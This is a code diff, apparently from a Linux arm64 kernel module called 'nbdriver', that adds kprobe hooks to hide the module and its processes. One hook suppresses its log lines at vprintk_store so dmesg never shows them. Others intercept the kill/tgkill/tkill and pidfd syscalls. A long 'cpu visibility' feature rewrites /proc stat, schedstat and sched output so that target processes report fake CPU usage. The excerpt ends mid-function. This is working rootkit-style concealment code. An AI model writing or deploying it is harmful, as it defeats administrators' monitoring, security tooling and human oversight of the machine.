+    if (nbdriver_ksym_lookup_optional("__arm64_sys_tgkill"))
+        nbdriver_tgkill_probe.symbol_name = "__arm64_sys_tgkill";
+    if (nbdriver_tgkill_probe.symbol_name) {
+        nbdriver_tgkill_probe.pre_handler = nbdriver_tgkill_pre;
+        if (register_kprobe(&nbdriver_tgkill_probe) == 0)
+            nbdriver_tgkill_hooked = true;
+        else
+            nbdriver_tgkill_probe.symbol_name = NULL;
+    }
+    if (nbdriver_ksym_lookup_optional("__arm64_sys_tkill"))
+        nbdriver_tkill_probe.symbol_name = "__arm64_sys_tkill";
+    if (nbdriver_tkill_probe.symbol_name) {
+        nbdriver_tkill_probe.pre_handler = nbdriver_kill_pre;
+        if (register_kprobe(&nbdriver_tkill_probe) == 0)
+            nbdriver_tkill_hooked = true;
+        else
+            nbdriver_tkill_probe.symbol_name = NULL;
+    }
+    return 0;
+}
+
+static void nbdriver_pidfd_visibility_exit(void)
+{
+    if (nbdriver_tkill_hooked) {
+        unregister_kprobe(&nbdriver_tkill_probe);
+        nbdriver_tkill_hooked = false;
+    }
+    if (nbdriver_tgkill_hooked) {
+        unregister_kprobe(&nbdriver_tgkill_probe);
+        nbdriver_tgkill_hooked = false;
+    }
+    if (nbdriver_kill_hooked) {
+        unregister_kprobe(&nbdriver_kill_probe);
+        nbdriver_kill_hooked = false;
+    }
+    if (nbdriver_pidfd_hooked) {
+        unregister_kprobe(&nbdriver_pidfd_probe);
+        nbdriver_pidfd_hooked = false;
+    }
+}
+
+static u32 nbdriver_pidfd_visibility_features(void)
+{
+    return READ_ONCE(nbdriver_pidfd_hooked) ? NBDRIVER_FEATURE_PIDFD_VISIBILITY : 0;
+}
+/* ===== END src/features/nbdriver_pidfd_visibility.c ===== */
+/* ===== BEGIN src/features/nbdriver_printk_visibility.c ===== */
+#include <linux/kprobes.h>
+#include <linux/printk.h>
+#include <linux/string.h>
+/* dmesg is the last place the module still announces itself, and it can only
+ * be closed globally: setting dmesg_restrict=1 also blocks the kernel log for
+ * every other consumer, and this build's own licence check reads it, so a
+ * global switch breaks authentication.
+ *
+ * Instead the message is dropped at the single point where it enters the ring
+ * buffer: vprintk_store(). Every pr_* macro funnels through it, so returning
+ * early there means the record is never stored and never appears in dmesg,
+ * /proc/kmsg or klogctl(), regardless of who reads them.
+ *
+ * Identification does not need the formatted text: this module's logging
+ * macros prepend a literal "nbdriver: " to the format string, so the fmt
+ * argument itself starts with the marker. Comparing that prefix is exact, is
+ * unaffected by rate limiting or by %p hashing, and never matches another
+ * subsystem's output. */
+static struct kprobe nbdriver_printk_probe;
+static bool nbdriver_printk_hooked;
+static atomic64_t nbdriver_printk_hits = ATOMIC64_INIT(0);
+
+#define NBDRIVER_PRINTK_MARKER "nbdriver: "
+#define NBDRIVER_PRINTK_MARKER_LEN (sizeof(NBDRIVER_PRINTK_MARKER) - 1)
+
+/* vprintk_store(int facility, int level, const struct dev_printk_info *dev_info,
+ *               const char *fmt, va_list args)
+ * fmt is the 4th argument. Returning 0 reports "nothing stored", which is the
+ * same value the function returns when printk recursion is detected. */
+static int NBDRIVER_NO_CFI nbdriver_printk_store_pre(struct kprobe *probe, struct pt_regs *regs)
+{
+    const char *fmt = (const char *)(unsigned long)regs->regs[3];
+
+    (void)probe;
+    if (!fmt)
+        return 0;
+    if (strncmp(fmt, NBDRIVER_PRINTK_MARKER, NBDRIVER_PRINTK_MARKER_LEN) != 0)
+        return 0;
+    regs_set_return_value(regs, 0);
+    instruction_pointer_set(regs, procedure_link_pointer(regs));
+    atomic64_inc(&nbdriver_printk_hits);
+    return 1;
+}
+
+static int nbdriver_printk_visibility_init(void)
+{
+    if (READ_ONCE(nbdriver_printk_hooked))
+        return 0;
+    if (!nbdriver_ksym_lookup_optional("vprintk_store"))
+        return -ENOENT;
+    nbdriver_printk_probe.symbol_name = "vprintk_store";
+    nbdriver_printk_probe.pre_handler = nbdriver_printk_store_pre;
+    if (register_kprobe(&nbdriver_printk_probe) != 0) {
+        nbdriver_printk_probe.symbol_name = NULL;
+        return -EIO;
+    }
+    WRITE_ONCE(nbdriver_printk_hooked, true);
+    return 0;
+}
+
+static void nbdriver_printk_visibility_exit(void)
+{
+    if (!READ_ONCE(nbdriver_printk_hooked))
+        return;
+    unregister_kprobe(&nbdriver_printk_probe);
+    WRITE_ONCE(nbdriver_printk_hooked, false);
+}
+
+static u32 nbdriver_printk_visibility_features(void)
+{
+    return READ_ONCE(nbdriver_printk_hooked) ? NBDRIVER_FEATURE_PRINTK_VISIBILITY : 0;
+}
+/* ===== END src/features/nbdriver_printk_visibility.c ===== */
+/* ===== BEGIN src/features/nbdriver_cpu_visibility.c ===== */
+#include <linux/jiffies.h>
+#include <linux/kprobes.h>
+#include <linux/math64.h>
 #include <linux/sched/signal.h>
 #include <linux/seq_file.h>
 #include <linux/spinlock.h>
+#include <linux/workqueue.h>
+
+#define CPU_VIS_SEGMENT_NS 2000000000ull
+#define CPU_VIS_SAMPLE_MS 250u
+#define CPU_VIS_WEIGHT_BITS 16u
+#define CPU_VIS_WEIGHT_TOTAL (1u << CPU_VIS_WEIGHT_BITS)
+
+struct cpu_vis_clock {
+    u64 base_ns;
+    u64 epoch_ns;
+    u32 pct_lo;
+    u32 pct_hi;
+    u32 phase;
+};
+
+struct cpu_vis_thread {
+    pid_t number;
+    u64 start_ns;
+    u64 real_ns;
+    u64 syn_ns;
+    u64 weight;
+    size_t previous;
+    u32 begin;
+    u32 end;
+};
 
 struct cpu_visibility_target {
     struct pid *identity;
-    pid_t number;
     u64 start_ns;
-    u32 pct_lo;
-    u32 pct_hi;
-    u32 window;
-    u32 current_pct;
-    u64 syn_ticks;        /* synthesised utime+stime in clock ticks */
-    u64 syn_num;          /* integral numerator, ticks * 1e11 */
-    u64 last_ns;
-    u64 armed_ns;         /* first observation, anchors the synth timeline */
-    u64 seg_start_ns;     /* start of the currently open segment */
-    u64 window_ns;
+    struct cpu_vis_clock clock;
+    struct cpu_vis_thread *threads;
+    size_t thread_count;
+    u64 sample_total_ns;
+    u64 retired_ns;
     u64 hits;
 };
 
-#define CPU_VIS_HZ 100u
-#define CPU_VIS_SEGMENT_NS 2000000000ull
+struct cpu_vis_args {
+    struct task_struct *task;
+    struct seq_file *m;
+    size_t record_start;
+};
 
 static struct cpu_visibility_target cpu_visibility_targets[NBDRIVER_CPU_VISIBILITY_MAX_TARGETS];
+static DEFINE_MUTEX(cpu_visibility_control_lock);
 static DEFINE_SPINLOCK(cpu_visibility_lock);
 static u32 cpu_visibility_count;
 static bool cpu_visibility_active;
 static int cpu_visibility_error;
-
 static struct kretprobe cpu_vis_tg_probe;
 static struct kretprobe cpu_vis_thr_probe;
 static struct kretprobe cpu_vis_ss_probe;
@@ -2922,455 +3749,490 @@ static bool cpu_vis_tg_hooked;
 static bool cpu_vis_thr_hooked;
 static bool cpu_vis_ss_hooked;
 static bool cpu_vis_sched_hooked;
-static DEFINE_PER_CPU(int, cpu_visibility_depth);
+static void cpu_visibility_sample_work(struct work_struct *work);
+static DECLARE_DELAYED_WORK(cpu_visibility_work, cpu_visibility_sample_work);
 
-/* Deterministic walk inside [lo, hi]; no allocation, no RNG. */
-static u32 cpu_visibility_walk(struct cpu_visibility_target *t, u32 seed)
+static u32 cpu_visibility_segment_pct(const struct cpu_vis_clock *clock, u64 segment)
 {
-    u32 span, rnd;
-    u64 mix;
+    u32 span = clock->pct_hi - clock->pct_lo;
+    u32 position;
 
-    if (t->pct_hi <= t->pct_lo)
-        return t->pct_lo;
-    span = t->pct_hi - t->pct_lo;
-    mix = t->syn_ticks ^ ((u64)t->window << 11);
-    rnd = (u32)(mix ^ (mix >> 29)) + seed;
-    rnd ^= rnd << 13;
-    rnd ^= rnd >> 17;
-    rnd ^= rnd << 5;
-    return t->pct_lo + (rnd % (span + 1));
+    if (!span)
+        return clock->pct_lo;
+    position = (segment + clock->phase) % (2u * span);
+    return clock->pct_lo + (position <= span ? position : 2u * span - position);
 }
 
-/* Accrue synthesised ticks. The synth total is a pure function of wall time
- * since the target was armed, so a burst of short calls (this handler runs on
- * every /proc/<pid>/stat read) cannot starve the accumulation the way a
- * per-call delta with integer division did: delta was arriving in tens of
- * microseconds and the quotient kept truncating to zero. */
-/* The synthesised total must be a pure function of wall time. Anything
- * incremental is wrong here: the number of /proc reads is arbitrary, so a
- * per-call accumulator makes the visible rate depend on how often the reader
- * samples (observed 200-1200% with the same configuration).
- *
- * Rate is a step function over fixed segments; the integral is closed-form:
- *   ticks(t) = tick_rate(seg_0) * T0 + tick_rate(seg_1) * T1 + ... + cur * Tnow
- * Segments before the current one are folded into syn_base, so each call costs
- * O(segments elapsed) instead of O(1) drift. */
-static void cpu_visibility_accrue(struct cpu_visibility_target *t, u64 now_ns)
+static u32 cpu_visibility_clock_pct(const struct cpu_vis_clock *clock, u64 now_ns)
 {
-    u64 delta, elapsed;
+    u64 elapsed = now_ns > clock->epoch_ns ? now_ns - clock->epoch_ns : 0;
 
-    if (!t->current_pct)
-        t->current_pct = t->pct_lo;
-
-    if (!t->armed_ns) {
-        t->armed_ns = now_ns ? now_ns : 1;
-        t->seg_start_ns = t->armed_ns;
-        return;
-    }
-    if (now_ns <= t->seg_start_ns)
-        return;
-
-    /* Fold every completed segment into the closed-form base. syn_base holds
-     * the integral of all finished segments in ticks*1e11 units so no
-     * precision is lost when segments are short. */
-    while (now_ns - t->seg_start_ns >= CPU_VIS_SEGMENT_NS) {
-        u64 span = CPU_VIS_SEGMENT_NS;
-        t->syn_num += span * (u64)t->current_pct * CPU_VIS_HZ;
-        t->seg_start_ns += span;
-        t->window++;
-        t->current_pct = cpu_visibility_walk(t, (u32)(t->number + t->window));
-    }
-
-    /* Current, still-open segment. */
-    delta = now_ns - t->seg_start_ns;
-    if (delta > 60000000000ull)
-        delta = 60000000000ull;
-    elapsed = t->syn_num + delta * (u64)t->current_pct * CPU_VIS_HZ;
-    t->syn_ticks = div64_u64(elapsed, 100000000000ull);
-    t->hits++;
+    return cpu_visibility_segment_pct(clock, div64_u64(elapsed, CPU_VIS_SEGMENT_NS));
 }
 
-static bool cpu_visibility_match(struct task_struct *task,
-    struct cpu_visibility_target **out)
+static u64 cpu_visibility_clock_total(const struct cpu_vis_clock *clock, u64 now_ns)
 {
-    struct pid *tgid;
+    u64 elapsed, segments, cycles, result, tail;
+    u32 period, remaining, i, pct;
+
+    if (now_ns <= clock->epoch_ns)
+        return clock->base_ns;
+    elapsed = now_ns - clock->epoch_ns;
+    if (clock->pct_lo == clock->pct_hi)
+        return clock->base_ns + div64_u64(elapsed, 100) * clock->pct_lo +
+            div64_u64((elapsed % 100) * clock->pct_lo, 100);
+
+    period = 2u * (clock->pct_hi - clock->pct_lo);
+    segments = div64_u64(elapsed, CPU_VIS_SEGMENT_NS);
+    cycles = div64_u64(segments, period);
+    remaining = segments % period;
+    result = clock->base_ns + cycles * (CPU_VIS_SEGMENT_NS / 100) *
+        (clock->pct_lo + clock->pct_hi) * (clock->pct_hi - clock->pct_lo);
+    for (i = 0; i < remaining; i++)
+        result += (CPU_VIS_SEGMENT_NS / 100) * cpu_visibility_segment_pct(clock, i);
+    tail = elapsed % CPU_VIS_SEGMENT_NS;
+    pct = cpu_visibility_segment_pct(clock, segments);
+    return result + div64_u64(tail * pct, 100);
+}
+
+/* A cycle assigns every nanosecond to one thread. This preserves both the
+ * exact sum and monotonic per-thread counters; subtracting two rounded ratios
+ * can make an individual counter decrease. */
+static u64 cpu_visibility_share(u64 budget, u32 begin, u32 end)
+{
+    u32 tail = budget & (CPU_VIS_WEIGHT_TOTAL - 1u);
+    u32 extra = tail > begin ? min(tail, end) - begin : 0;
+
+    return (budget >> CPU_VIS_WEIGHT_BITS) * (end - begin) + extra;
+}
+
+static u64 cpu_visibility_prepare_sample(const struct cpu_vis_thread *old,
+    size_t old_count, struct cpu_vis_thread *next, size_t count, u64 budget)
+{
+    u64 total_weight = 0, prefix = 0, retired = 0;
+    size_t i, j;
+    u32 begin = 0;
+
+    for (i = 0; i < count; i++) {
+        const struct cpu_vis_thread *previous = NULL;
+
+        for (j = 0; j < old_count; j++) {
+            if (next[i].number == old[j].number && next[i].start_ns == old[j].start_ns) {
+                previous = &old[j];
+                break;
+            }
+        }
+        next[i].previous = j;
+        next[i].syn_ns = previous ? previous->syn_ns +
+            cpu_visibility_share(budget, previous->begin, previous->end) : 0;
+        next[i].weight = previous ? next[i].real_ns - previous->real_ns : next[i].real_ns;
+        total_weight += next[i].weight;
+    }
+    for (j = 0; j < old_count; j++) {
+        for (i = 0; i < count; i++) {
+            if (next[i].number == old[j].number && next[i].start_ns == old[j].start_ns)
+                break;
+        }
+        if (i == count)
+            retired += old[j].syn_ns + cpu_visibility_share(budget, old[j].begin, old[j].end);
+    }
+    if (!total_weight) {
+        for (i = 0; i < count; i++) {
+            next[i].weight = 0;
+            for (j = 0; j < old_count; j++) {
+                if (next[i].number == old[j].number && next[i].start_ns == old[j].start_ns) {
+                    next[i].weight = old[j].end - old[j].begin;
+                    break;
+                }
+            }
+            total_weight += next[i].weight;
+        }
+    }
+    if (!total_weight && count) {
+        next[0].weight = 1;
+        total_weight = 1;
+    }
+    for (i = 0; i < count; i++) {
+        prefix += next[i].weight;
+        next[i].begin = begin;
+        next[i].end = mul_u64_u64_div_u64(prefix, CPU_VIS_WEIGHT_TOTAL, total_weight);
+        begin = next[i].end;
+    }
+    return retired;
+}
+
+static int cpu_visibility_collect(struct task_struct *task,
+    struct cpu_vis_thread **out, size_t *out_count)
+{
+    struct cpu_vis_thread *threads;
+    struct task_struct *thread;
+    size_t capacity, count;
+    int attempt;
+
+    for (attempt = 0; attempt < 3; attempt++) {
+        capacity = (size_t)get_nr_threads(task) + 8;
+        threads = kcalloc(capacity, sizeof(*threads), GFP_KERNEL);
+        if (!threads)
+            return -ENOMEM;
+        count = 0;
+        rcu_read_lock();
+        for_each_thread(task, thread) {
+            if (count == capacity)
+                break;
+            threads[count].number = task_pid_nr(thread);
+            threads[count].start_ns = READ_ONCE(thread->start_boottime);
+            threads[count].real_ns = READ_ONCE(thread->se.sum_exec_runtime);
+            count++;
+        }
+        rcu_read_unlock();
+        if (count && count < capacity) {
+            *out = threads;
+            *out_count = count;
+            return 0;
+        }
+        kfree(threads);
+        if (!count)
+            return -ESRCH;
+    }
+    return -EAGAIN;
+}
+
+static void cpu_visibility_detach(unsigned int index)
+{
+    struct cpu_visibility_target *target = &cpu_visibility_targets[index];
+    struct cpu_vis_thread *threads;
+    struct pid *identity;
+    unsigned long flags;
+
+    spin_lock_irqsave(&cpu_visibility_lock, flags);
+    identity = target->identity;
+    threads = target->threads;
+    memset(target, 0, sizeof(*target));
+    if (identity)
+        cpu_visibility_count--;
+    spin_unlock_irqrestore(&cpu_visibility_lock, flags);
+    put_pid(identity);
+    kfree(threads);
+}
+
+static void cpu_visibility_sample_work(struct work_struct *work)
+{
     unsigned int i;
 
-    if (!task)
-        return false;
-    tgid = task_tgid(task);
-    if (!tgid || !READ_ONCE(cpu_visibility_count))
-        return false;
+    (void)work;
+    mutex_lock(&cpu_visibility_control_lock);
     for (i = 0; i < ARRAY_SIZE(cpu_visibility_targets); i++) {
-        struct cpu_visibility_target *t = &cpu_visibility_targets[i];
-        if (READ_ONCE(t->identity) == tgid) {
-            *out = t;
+        struct cpu_visibility_target *target = &cpu_visibility_targets[i];
+        struct cpu_vis_thread *next, *old;
+        struct task_struct *task;
+        size_t count;
+        u64 total, retired, committed, budget, live_extra = 0;
+        size_t j;
+        unsigned long flags;
+        int ret;
+
+        if (!target->identity)
+            continue;
+        task = get_pid_task(target->identity, PIDTYPE_TGID);
+        if (!task) {
+            cpu_visibility_detach(i);
+            continue;
+        }
+        ret = cpu_visibility_collect(task, &next, &count);
+        put_task_struct(task);
+        if (ret) {
+            if (ret == -ESRCH)
+                cpu_visibility_detach(i);
+            continue;
+        }
+        total = cpu_visibility_clock_total(&target->clock, ktime_get_ns());
+        old = target->threads;
+        retired = cpu_visibility_prepare_sample(old, target->thread_count, next, count,
+            total - target->sample_total_ns);
+        spin_lock_irqsave(&cpu_visibility_lock, flags);
+        committed = cpu_visibility_clock_total(&target->clock, ktime_get_ns());
+        budget = total - target->sample_total_ns;
+        for (j = 0; j < count; j++) {
+            const struct cpu_vis_thread *previous;
+            u64 extra;
+
+            if (next[j].previous == target->thread_count)
+                continue;
+            previous = &old[next[j].previous];
+            extra = cpu_visibility_share(committed - target->sample_total_ns,
+                previous->begin, previous->end) -
+                cpu_visibility_share(budget, previous->begin, previous->end);
+            next[j].syn_ns += extra;
+            live_extra += extra;
+        }
+        retired += committed - total - live_extra;
+        target->threads = next;
+        target->thread_count = count;
+        target->sample_total_ns = committed;
+        target->retired_ns += retired;
+        spin_unlock_irqrestore(&cpu_visibility_lock, flags);
+        kfree(old);
+    }
+    mutex_unlock(&cpu_visibility_control_lock);
+    if (READ_ONCE(cpu_visibility_active))
+        schedule_delayed_work(&cpu_visibility_work, msecs_to_jiffies(CPU_VIS_SAMPLE_MS));
+}
+
+static bool cpu_visibility_read_runtime(struct task_struct *task, bool group, u64 *runtime)
+{
+    struct pid *identity = task_tgid(task);
+    unsigned long flags;
+    unsigned int i;
+    bool found = false;
+
+    spin_lock_irqsave(&cpu_visibility_lock, flags);
+    for (i = 0; i < ARRAY_SIZE(cpu_visibility_targets); i++) {
+        struct cpu_visibility_target *target = &cpu_visibility_targets[i];
+        u64 total;
+        size_t j;
+
+        if (!identity || target->identity != identity)
+            continue;
+        total = cpu_visibility_clock_total(&target->clock, ktime_get_ns());
+        if (group) {
+            *runtime = total;
+            found = true;
+        } else {
+            for (j = 0; j < target->thread_count; j++) {
+                struct cpu_vis_thread *thread = &target->threads[j];
+
+                if (thread->number != task_pid_nr(task) ||
+                    thread->start_ns != READ_ONCE(task->start_boottime))
+                    continue;
+                *runtime = thread->syn_ns + cpu_visibility_share(
+                    total - target->sample_total_ns, thread->begin, thread->end);
+                found = true;
+                break;
+            }
+            if (!found) {
+                *runtime = 0;
+                found = true;
+            }
+        }
+        target->hits++;
+        break;
+    }
+    spin_unlock_irqrestore(&cpu_visibility_lock, flags);
+    return found;
+}
+
+static bool cpu_visibility_record_valid(const struct cpu_vis_args *args)
+{
+    return args && args->m && args->m->buf && !seq_has_overflowed(args->m) &&
+        args->m->count < args->m->size && args->record_start < args->m->count;
+}
+
+static bool cpu_visibility_replace(struct seq_file *m, size_t start, size_t length,
+    const char *text, size_t text_length)
+{
+    size_t retained;
+
+    if (!m->buf || m->count >= m->size || start > m->count || length > m->count - start)
+        return false;
+    retained = m->count - length;
+    if (text_length >= m->size - retained) {
+        m->count = m->size;
+        return false;
+    }
+    memmove(m->buf + start + text_length, m->buf + start + length,
+        m->count - start - length);
+    memcpy(m->buf + start, text, text_length);
+    m->count = retained + text_length;
+    return true;
+}
+
+static bool cpu_visibility_stat_fields(const struct cpu_vis_args *args, size_t *start,
+    size_t *length)
+{
+    const char *buf;
+    size_t p, end, first = 0;
+    unsigned int field;
+
+    if (!cpu_visibility_record_valid(args))
+        return false;
+    buf = args->m->buf;
+    end = args->m->count;
+    p = end;
+    while (p > args->record_start && buf[p - 1] != ')')
+        p--;
+    if (p == args->record_start)
+        return false;
+    for (field = 3; field <= 15; field++) {
+        size_t token;
+
+        while (p < end && buf[p] == ' ')
+            p++;
+        token = p;
+        while (p < end && buf[p] != ' ' && buf[p] != '\n')
+            p++;
+        if (p == token || p == end)
+            return false;
+        if (field == 14)
+            first = token;
+        if (field == 15) {
+            *start = first;
+            *length = p - first;
             return true;
         }
     }
     return false;
 }
 
-/* Capture the task at entry: the kretprobe handler runs after the show function
- * returned, when x3 (task) no longer holds it. Only the task pointer is taken
- * here; the seq_file output is rewritten through m->buf afterwards. */
-struct cpu_vis_args {
-    struct task_struct *task;
-    struct seq_file *m;
-};
+static bool cpu_visibility_rewrite(struct cpu_vis_args *args, u64 ticks)
+{
+    size_t start, length;
+    char text[48];
+    u64 system = div64_u64(ticks, 3);
+    int written;
 
-/* proc_tgid_stat()/proc_tid_stat()/proc_pid_schedstat() share one layout:
- *   (struct seq_file *m, struct pid_namespace *ns,
- *    struct pid *pid, struct task_struct *task)
- * so m is argument 0 and task is argument 3. */
-static int cpu_vis_capture_entry(struct kretprobe_instance *instance,
-    struct pt_regs *regs)
+    if (!cpu_visibility_stat_fields(args, &start, &length))
+        return false;
+    written = snprintf(text, sizeof(text), "%llu %llu",
+        (unsigned long long)(ticks - system), (unsigned long long)system);
+    return cpu_visibility_replace(args->m, start, length, text, written);
+}
+
+static bool cpu_visibility_rewrite_schedstat(struct cpu_vis_args *args, u64 ns)
+{
+    size_t start, end;
+    char text[24];
+    int written;
+
+    if (!cpu_visibility_record_valid(args))
+        return false;
+    start = args->record_start;
+    end = start;
+    while (end < args->m->count && args->m->buf[end] >= '0' && args->m->buf[end] <= '9')
+        end++;
+    if (end == start || end == args->m->count || args->m->buf[end] != ' ')
+        return false;
+    written = snprintf(text, sizeof(text), "%llu", (unsigned long long)ns);
+    return cpu_visibility_replace(args->m, start, end - start, text, written);
+}
+
+static bool cpu_visibility_rewrite_sched(struct cpu_vis_args *args, u64 ns)
+{
+    static const char name[] = "se.sum_exec_runtime";
+    const char *buf;
+    size_t line, end;
+    char text[40];
+    int written;
+
+    if (!cpu_visibility_record_valid(args))
+        return false;
+    buf = args->m->buf;
+    end = args->m->count;
+    line = args->record_start;
+    while (line < end) {
+        size_t line_end = line, p = line, number;
+
+        while (line_end < end && buf[line_end] != '\n')
+            line_end++;
+        while (p < line_end && buf[p] == ' ')
+            p++;
+        if (line_end - p < sizeof(name) - 1 || memcmp(buf + p, name, sizeof(name) - 1)) {
+            line = line_end + (line_end < end);
+            continue;
+        }
+        p += sizeof(name) - 1;
+        while (p < line_end && buf[p] == ' ')
+            p++;
+        if (p == line_end || buf[p++] != ':')
+            return false;
+        while (p < line_end && buf[p] == ' ')
+            p++;
+        number = p;
+        while (p < line_end && ((buf[p] >= '0' && buf[p] <= '9') || buf[p] == '.'))
+            p++;
+        if (p == number)
+            return false;
+        written = snprintf(text, sizeof(text), "%llu.%06u",
+            (unsigned long long)div64_u64(ns, 1000000), (u32)(ns % 1000000));
+        return cpu_visibility_replace(args->m, number, p - number, text, written);
+    }
+    return false;
+}
+
+static int cpu_vis_capture_entry(struct kretprobe_instance *instance, struct pt_regs *regs)
 {
     struct cpu_vis_args *args = (struct cpu_vis_args *)instance->data;
 
-    if (!args || !READ_ONCE(cpu_visibility_active))
+    if (!READ_ONCE(cpu_visibility_active))
         return 1;
     args->m = (struct seq_file *)(unsigned long)regs->regs[0];
     args->task = (struct task_struct *)(unsigned long)regs->regs[3];
-    return (args->m && args->task) ? 0 : 1;
+    args->record_start = args->m->count;
+    return 0;
 }
 
-/* proc_sched_show_task() has a different layout:
- *   (struct task_struct *p, struct pid_namespace *ns, struct seq_file *m)
- * Reading it with the layout above treated the task pointer as a seq_file,
- * which is what dereferenced into the machine freeze. */
-static int cpu_vis_capture_entry_sched(struct kretprobe_instance *instance,
-    struct pt_regs *regs)
+static int cpu_vis_capture_entry_sched(struct kretprobe_instance *instance, struct pt_regs *regs)
 {
     struct cpu_vis_args *args = (struct cpu_vis_args *)instance->data;
 
-    if (!args || !READ_ONCE(cpu_visibility_active))
+    if (!READ_ONCE(cpu_visibility_active))
         return 1;
+    /* proc_sched_show_task(task, ns, m) differs from the proc stat callbacks. */
     args->task = (struct task_struct *)(unsigned long)regs->regs[0];
     args->m = (struct seq_file *)(unsigned long)regs->regs[2];
-    return (args->m && args->task) ? 0 : 1;
-}
-
-/* Overwrite the utime/stime fields that proc_tgid_stat()/proc_tid_stat() just
- * emitted. /proc/<pid>/stat is "pid (comm) state ppid ... utime stime ..." with
- * 52 fields; utime is field 14 and stime is field 15, both decimal and never
- * negative. comm may contain spaces and parentheses, so counting starts after
- * the last ')'. The replacement is only accepted when the new number is not
- * longer than the old one; a longer number would need to push the rest of the
- * buffer, which is not worth doing under a spinlock. */
-static int cpu_visibility_rewrite(struct cpu_vis_args *args, u64 ticks)
-{
-    char *buf, *p, *end, tmp[24];
-    int field, oldlen, newlen, pad;
-
-    if (!args->m || !args->m->buf || !args->m->count)
-        return 0;
-    buf = args->m->buf;
-    end = buf + args->m->count;
-
-    p = strrchr(buf, ')');
-    if (!p || p >= end)
-        return 0;
-    p++;
-    field = 3;
-
-    while (p < end && field <= 15) {
-        char *fs;
-
-        while (p < end && *p == ' ')
-            p++;
-        if (p >= end)
-            break;
-        fs = p;
-        while (p < end && *p != ' ')
-            p++;
-
-        if (field == 14 || field == 15) {
-            /* Split 2:1 so utime+stime equals the synthesised total exactly.
-             * Writing the same value into both fields doubled what every reader
-             * computes and pushed the visible percentage far past the ceiling. */
-            u64 val = (field == 14) ? div_u64(ticks * 2ull, 3ull)
-                                    : ticks - div_u64(ticks * 2ull, 3ull);
-            newlen = snprintf(tmp, sizeof(tmp), "%llu",
-                              (unsigned long long)val);
-            oldlen = (int)(p - fs);
-            if (newlen > 0 && newlen <= oldlen) {
-                /* fits: overwrite and blank the remainder */
-                memcpy(fs, tmp, newlen);
-                pad = oldlen - newlen;
-                if (pad > 0)
-                    memset(fs + newlen, ' ', pad);
-            } else if (newlen > 0 && newlen < (int)sizeof(tmp)) {
-                /* grew: shift the tail right so no field boundary moves */
-                int grow = newlen - oldlen;
-                if (end + grow < buf + args->m->size) {
-                    memmove(p + grow, p, end - p);
-                    memcpy(fs, tmp, newlen);
-                    args->m->count += grow;
-                    end += grow;
-                    p += grow;
-                }
-            }
-        }
-        field++;
-    }
+    args->record_start = args->m->count;
     return 0;
-}
-
-/* schedstat prints "%llu %llu %lu\n": runtime, run_delay, pcount. Readers such
- * as Scene difference the first field. The whole line is rebuilt with the same
- * separators, and only accepted when it is no longer than the original, so the
- * buffer length and field boundaries can never move. */
-static int cpu_visibility_rewrite_schedstat(struct cpu_vis_args *args, u64 ns)
-{
-    char tmp[80];
-    unsigned long long wait;
-    unsigned long pc;
-    int newlen, oldlen;
-    char *buf;
-
-    if (!args->m || !args->m->buf || args->m->count < 4)
-        return 0;
-    buf = args->m->buf;
-
-    /* Parse the two trailing fields so they survive unchanged. */
-    wait = 0;
-    pc = 0;
-    if (sscanf(buf, "%*u %llu %lu", &wait, &pc) != 2) {
-        wait = 0;
-        pc = 0;
-    }
-
-    oldlen = 0;
-    while (oldlen < (int)args->m->count && buf[oldlen] != '\n')
-        oldlen++;
-    if (oldlen <= 0)
-        return 0;
-
-    newlen = snprintf(tmp, sizeof(tmp), "%llu %llu %lu",
-                      (unsigned long long)ns, wait, pc);
-    if (newlen <= 0 || newlen > oldlen)
-        return 0;
-
-    memcpy(buf, tmp, newlen);
-    /* keep the line terminator where it was; pad the gap with spaces */
-    memset(buf + newlen, ' ', oldlen - newlen);
-    buf[oldlen] = '\n';
-    return 0;
-}
-
-/* /proc/<pid>/sched prints "se.sum_exec_runtime : <sec>.<usec>". Replace just
- * the number, right-padded, so nothing downstream shifts. */
-static int cpu_visibility_rewrite_sched(struct cpu_vis_args *args, u64 ns)
-{
-    char tmp[40];
-    char *buf, *end, *line, *colon, *num;
-    size_t linelen;
-    int newlen;
-
-    if (!args->m || !args->m->buf || !args->m->count)
-        return 0;
-    buf = args->m->buf;
-    end = buf + args->m->count;
-
-    line = NULL;
-    for (char *q = buf; q + 19 < end; q++) {
-        if (q == buf || q[-1] == '\n') {
-            char *r = q;
-            while (r < end && *r == ' ')
-                r++;
-            if (r + 19 <= end && !strncmp(r, "se.sum_exec_runtime", 19)) {
-                line = r;
-                break;
-            }
-        }
-    }
-    if (!line)
-        return 0;
-
-    colon = memchr(line, ':', end - line);
-    if (!colon)
-        return 0;
-    num = colon + 1;
-    while (num < end && *num == ' ')
-        num++;
-    if (num >= end)
-        return 0;
-
-    linelen = 0;
-    while (num + linelen < end && num[linelen] != '\n')
-        linelen++;
-    if (linelen == 0)
-        return 0;
-
-    newlen = snprintf(tmp, sizeof(tmp), "%llu.%06llu",
-                      (unsigned long long)div_u64(ns, 1000000000ull),
-                      (unsigned long long)(div_u64(ns, 1000ull) % 1000000ull));
-    if (newlen <= 0 || (size_t)newlen > linelen)
-        return 0;
-
-    memcpy(num, tmp, newlen);
-    memset(num + newlen, ' ', linelen - newlen);
-    return 0;
-}
-
-static int cpu_vis_apply_schedstat_return(struct kretprobe_instance *instance,
-    struct pt_regs *regs)
-{
-    struct cpu_vis_args *args = (struct cpu_vis_args *)instance->data;
-    struct cpu_visibility_target *t = NULL;
-    unsigned long flags;
-    u64 ns;
-    int depth;
-
-    (void)regs;
-    if (!args || !READ_ONCE(cpu_visibility_active))
-        return 0;
-    if (!args->task || !args->m)
-        return 0;
-    if (!cpu_visibility_match(args->task, &t) || !t)
-        return 0;
-
-    depth = this_cpu_inc_return(cpu_visibility_depth);
-    if (depth > 1) {
-        this_cpu_dec(cpu_visibility_depth);
-        return 0;
-    }
-    if (spin_trylock_irqsave(&cpu_visibility_lock, flags)) {
-        cpu_visibility_accrue(t, ktime_get_mono_fast_ns());
-        ns = t->syn_ticks * (1000000000ull / CPU_VIS_HZ);
-        spin_unlock_irqrestore(&cpu_visibility_lock, flags);
-        cpu_visibility_rewrite_schedstat(args, ns);
-    }
-    this_cpu_dec(cpu_visibility_depth);
-    return 0;
-}
-
-static int cpu_vis_apply_sched_return(struct kretprobe_instance *instance,
-    struct pt_regs *regs)
-{
-    struct cpu_vis_args *args = (struct cpu_vis_args *)instance->data;
-    struct cpu_visibility_target *t = NULL;
-    unsigned long flags;
-    u64 ns;
-    int depth;
-
-    (void)regs;
-    if (!args || !READ_ONCE(cpu_visibility_active))
-        return 0;
-    if (!args->task || !args->m)
-        return 0;
